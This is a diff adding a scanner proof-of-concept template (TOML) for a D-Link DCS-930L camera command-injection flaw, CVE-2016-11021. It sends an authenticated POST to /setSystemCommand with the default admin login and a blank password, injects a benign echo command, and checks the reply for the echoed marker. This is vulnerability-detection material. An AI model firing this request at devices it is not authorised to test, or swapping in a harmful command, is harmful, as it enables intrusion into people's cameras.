@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 D-Link DCS-930L 网络摄像头 /setSystemCommand 接口是否存在操作系统命令注入漏洞。通过 HTTP Basic 认证后向该接口 POST 注入命令，验证命令执行。"
+id = "POC-AVE-2016-0108"
+name = "D-Link DCS-930L OS Command Injection PoC"
+severity = "high"
+tags = [
+    "cve-2016-11021",
+    "d-link",
+    "dcs-930l",
+    "command-injection",
+]
+vuln_id = [
+    "CVE-2016-11021",
+    "AVE-2016-0108",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/setSystemCommand"
+protocol = "http"
+
+[poc.requests.body]
+content = "ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=echo%20AVE_TEST&ConfigSystemCommand=Save"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Basic {{base64(admin:)}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
